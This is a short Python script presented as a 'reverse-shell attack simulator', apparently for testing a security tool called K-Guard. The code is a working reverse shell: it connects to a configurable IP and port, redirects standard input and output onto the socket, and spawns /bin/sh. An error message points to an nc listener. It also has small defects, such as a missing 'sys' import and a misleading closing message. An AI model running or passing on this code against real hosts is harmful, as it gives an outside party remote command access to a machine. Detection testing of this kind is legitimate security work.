#!/usr/bin/env python3
""" Reverse-Shell Attack Simulator"""

import socket
import os
import pty
import subprocess
import argparse


def run_reverse_shell_sim(target_ip, target_port):
    print(f"[*] Starting Reverse-Shell Simulation Process (PID: {os.getpid()})")
    print(f"[*] Connecting back to {target_ip}:{target_port}...")

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target_ip, target_port))
        os.dup2(s.fileno(),0)
        os.dup2(s.fileno(),1)
        os.dup2(s.fileno(),2)
        pty.spawn("/bin/sh")
    except ConnectionRefusedError:
        print("[-] Connection refused! Start a listener first: nc -lvnp <port>")
        sys.exit(1)
    except Exception as e:
        print(f"[-] Network error occurred: {e}")
        sys.exit(1)

    print("[+] Connected. Saving real stdio, then redirecting it onto the socket...")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="K-Guard Reverse Shell Simulator")
    parser.add_argument("--ip", default="127.0.0.1", help="Destination IP (default: 127.0.0.1)")
    parser.add_argument("--port", type=int, default=9999, help="Destination Port (default: 9999)")

    args = parser.parse_args()
    run_reverse_shell_sim(args.ip, args.port)
